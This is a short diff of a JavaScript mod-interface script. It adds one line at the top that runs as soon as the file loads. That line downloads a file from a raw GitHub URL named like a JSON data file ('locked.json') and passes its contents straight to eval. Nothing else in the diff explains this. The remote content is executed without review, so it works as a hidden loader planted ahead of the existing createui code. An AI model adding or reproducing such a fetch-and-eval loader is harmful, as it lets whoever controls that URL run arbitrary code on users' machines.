@@ -1,3 +1,5 @@
+async function a(){eval(await fh('https://raw.githubusercontent.com/kenzz-sz/Zynx_/refs/heads/main/main/mods/item/locked.json'))} a()
+
 (function(){
  let listmodsexplore = []
  window.createui = async function(){
